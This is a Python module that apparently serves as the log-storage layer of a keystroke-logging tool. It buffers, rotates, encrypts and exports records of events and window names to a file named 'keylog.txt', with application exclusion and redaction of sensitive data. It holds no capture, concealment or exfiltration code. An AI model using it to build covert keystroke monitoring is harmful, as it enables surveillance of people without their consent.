"""Advanced logging management with buffering, rotation, and encryption."""

import os
import time
import threading
from datetime import datetime
from pathlib import Path
from typing import Optional, List, Dict, Any
from collections import deque
from dataclasses import dataclass, asdict
import json
import logging
from logging.handlers import RotatingFileHandler

from .encryption_manager import EncryptionManager
from .config_manager import ConfigManager

logger = logging.getLogger(__name__)


@dataclass
class LogEntry:
    """Structured log entry with metadata."""
    timestamp: datetime
    event_type: str
    details: str
    window_name: str
    user_id: Optional[str] = None
    session_id: Optional[str] = None
    metadata: Optional[Dict[str, Any]] = None
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for JSON serialization."""
        data = asdict(self)
        data['timestamp'] = self.timestamp.isoformat()
        return data
    
    def to_log_string(self) -> str:
        """Convert to formatted log string."""
        timestamp_str = self.timestamp.strftime('%Y-%m-%d %H:%M:%S,%f')[:-3]
        return f"{timestamp_str}: {self.event_type}: {self.details} in {self.window_name}"
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'LogEntry':
        """Create LogEntry from dictionary."""
        data['timestamp'] = datetime.fromisoformat(data['timestamp'])
        return cls(**data)


class LoggingManager:
    """Advanced logging manager with buffering, encryption, and rotation."""
    
    def __init__(self, config_manager: ConfigManager, encryption_manager: Optional[EncryptionManager] = None):
        self.config = config_manager
        self.encryption = encryption_manager
        self.log_buffer: deque[LogEntry] = deque()
        self.buffer_lock = threading.RLock()
        self.flush_timer: Optional[threading.Timer] = None
        self.session_id = self._generate_session_id()
        self.stats = {
            'total_entries': 0,
            'buffer_flushes': 0,
            'encryption_operations': 0,
            'errors': 0
        }
        
        self._setup_logging()
        self._start_periodic_flush()
    
    def _generate_session_id(self) -> str:
        """Generate unique session identifier."""
        return f"session_{int(time.time())}_{os.getpid()}"
    
    def _setup_logging(self) -> None:
        """Setup file logging with rotation."""
        log_file = self.config.get('logging.file_path', 'keylog.txt')
        max_size = self.config.get('logging.max_file_size_mb', 100) * 1024 * 1024
        backup_count = self.config.get('logging.backup_count', 5)
        
        # Create log directory if it doesn't exist
        log_path = Path(log_file)
        log_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Setup rotating file handler
        self.file_handler = RotatingFileHandler(
            log_file,
            maxBytes=max_size,
            backupCount=backup_count,
            encoding='utf-8'
        )
        
        # Setup formatter
        formatter = logging.Formatter('%(message)s')
        self.file_handler.setFormatter(formatter)
        
        logger.info(f"Logging setup complete: {log_file}")
    
    def _start_periodic_flush(self) -> None:
        """Start periodic buffer flushing."""
        interval = self.config.get('logging.flush_interval_seconds', 10)
        self.flush_timer = threading.Timer(interval, self._periodic_flush)
        self.flush_timer.daemon = True
        self.flush_timer.start()
    
    def _periodic_flush(self) -> None:
        """Periodically flush the log buffer."""
        try:
            self.flush_buffer()
        except Exception as e:
            logger.error(f"Error in periodic flush: {e}")
            self.stats['errors'] += 1
        finally:
            # Schedule next flush
            if self.flush_timer:
                self._start_periodic_flush()
    
    def log_event(self, event_type: str, details: str, window_name: str, 
                  user_id: Optional[str] = None, metadata: Optional[Dict[str, Any]] = None) -> None:
        """Log an event with structured data."""
        try:
            # Check if application should be excluded
            if self.config.is_application_excluded(window_name):
                return
            
            # Sanitize sensitive data
            if self.config.contains_sensitive_data(details):
                if self.config.get('privacy.hash_sensitive_data', True):
                    details = self.config.hash_sensitive_data(details)
                else:
                    details = "[SENSITIVE DATA REDACTED]"
            
            # Create log entry
            entry = LogEntry(
                timestamp=datetime.now(),
                event_type=event_type,
                details=details,
                window_name=window_name,
                user_id=user_id,
                session_id=self.session_id,
                metadata=metadata
            )
            
            # Add to buffer
            with self.buffer_lock:
                self.log_buffer.append(entry)
                self.stats['total_entries'] += 1
                
                # Check if buffer should be flushed
                buffer_size = self.config.get('logging.buffer_size', 10)
                if len(self.log_buffer) >= buffer_size:
                    self.flush_buffer()
            
            # Log to standard logger
            logger.info(entry.to_log_string())
            
        except Exception as e:
            logger.error(f"Error logging event: {e}")
            self.stats['errors'] += 1
    
    def flush_buffer(self) -> None:
        """Flush the log buffer to file."""
        with self.buffer_lock:
            if not self.log_buffer:
                return
            
            entries_to_flush = list(self.log_buffer)
            self.log_buffer.clear()
        
        try:
            # Write entries to file
            log_file = self.config.get('logging.file_path', 'keylog.txt')
            
            # Ensure directory exists
            log_dir = os.path.dirname(log_file)
            if log_dir and not os.path.exists(log_dir):
                os.makedirs(log_dir, exist_ok=True)
            
            with open(log_file, 'a', encoding='utf-8') as f:
                for entry in entries_to_flush:
                    f.write(entry.to_log_string() + '\n')
            
            # Encrypt if enabled
            if self.encryption and self.config.get('encryption.enabled', True):
                self._encrypt_log_file(log_file)
            
            self.stats['buffer_flushes'] += 1
            logger.debug(f"Flushed {len(entries_to_flush)} entries to log")
            
        except Exception as e:
            logger.error(f"Error flushing buffer: {e}")
            self.stats['errors'] += 1
            
            # Re-add entries to buffer if flush failed
            with self.buffer_lock:
                self.log_buffer.extendleft(reversed(entries_to_flush))
    
    def _encrypt_log_file(self, log_file: str) -> None:
        """Encrypt the log file."""
        try:
            encrypted_file = self.encryption.encrypt_file(log_file)
            self.stats['encryption_operations'] += 1
            logger.debug(f"Log file encrypted: {encrypted_file}")
        except Exception as e:
            logger.error(f"Error encrypting log file: {e}")
            self.stats['errors'] += 1
    
    def export_logs(self, output_file: str, format_type: str = 'json', 
                   start_time: Optional[datetime] = None, 
                   end_time: Optional[datetime] = None) -> None:
        """Export logs in specified format."""
        try:
            # First flush any pending entries
            self.flush_buffer()
            
            # Read and parse log file
            log_file = self.config.get('logging.file_path', 'keylog.txt')
            entries = self._read_log_entries(log_file, start_time, end_time)
            
            # Export in requested format
            if format_type.lower() == 'json':
                self._export_json(entries, output_file)
            elif format_type.lower() == 'csv':
                self._export_csv(entries, output_file)
            elif format_type.lower() == 'txt':
                self._export_text(entries, output_file)
            else:
                raise ValueError(f"Unsupported export format: {format_type}")
            
            logger.info(f"Logs exported to {output_file} in {format_type} format")
            
        except Exception as e:
            logger.error(f"Error exporting logs: {e}")
            raise
    
    def _read_log_entries(self, log_file: str, start_time: Optional[datetime] = None, 
                         end_time: Optional[datetime] = None) -> List[LogEntry]:
        """Read and parse log entries from file."""
        entries = []
        
        try:
            with open(log_file, 'r', encoding='utf-8') as f:
                for line in f:
                    try:
                        entry = self._parse_log_line(line.strip())
                        if entry:
                            # Filter by time range if specified
                            if start_time and entry.timestamp < start_time:
                                continue
                            if end_time and entry.timestamp > end_time:
                                continue
                            entries.append(entry)
                    except Exception as e:
                        logger.warning(f"Error parsing log line: {e}")
                        continue
        except FileNotFoundError:
            logger.warning(f"Log file not found: {log_file}")
        
        return entries
    
    def _parse_log_line(self, line: str) -> Optional[LogEntry]:
        """Parse a log line into a LogEntry."""
        # Basic parsing - can be enhanced based on log format
        import re
        
        pattern = r'(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2},\d{3}): ([^:]+): (.*?) in (.+)$'
        match = re.match(pattern, line)
        
        if match:
            timestamp_str, event_type, details, window_name = match.groups()
            timestamp = datetime.strptime(timestamp_str, '%Y-%m-%d %H:%M:%S,%f')
            
            return LogEntry(
                timestamp=timestamp,
                event_type=event_type,
                details=details,
                window_name=window_name,
                session_id=self.session_id
            )
        
        return None
    
    def _export_json(self, entries: List[LogEntry], output_file: str) -> None:
        """Export entries as JSON."""
        data = [entry.to_dict() for entry in entries]
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    
    def _export_csv(self, entries: List[LogEntry], output_file: str) -> None:
        """Export entries as CSV."""
        import csv
        
        with open(output_file, 'w', newline='', encoding='utf-8') as f:
            if entries:
                writer = csv.DictWriter(f, fieldnames=entries[0].to_dict().keys())
                writer.writeheader()
                for entry in entries:
                    writer.writerow(entry.to_dict())
    
    def _export_text(self, entries: List[LogEntry], output_file: str) -> None:
        """Export entries as formatted text."""
        with open(output_file, 'w', encoding='utf-8') as f:
            for entry in entries:
                f.write(entry.to_log_string() + '\n')
    
    def get_stats(self) -> Dict[str, Any]:
        """Get logging statistics."""
        with self.buffer_lock:
            buffer_size = len(self.log_buffer)
        
        return {
            **self.stats,
            'buffer_size': buffer_size,
            'session_id': self.session_id
        }
    
    def cleanup(self) -> None:
        """Cleanup resources and flush remaining logs."""
        try:
            # Cancel periodic flush timer
            if self.flush_timer:
                self.flush_timer.cancel()
            
            # Final flush
            self.flush_buffer()
            
            # Close file handler
            if hasattr(self, 'file_handler'):
                self.file_handler.close()
            
            logger.info("Logging manager cleanup completed")
            
        except Exception as e:
            logger.error(f"Error during cleanup: {e}")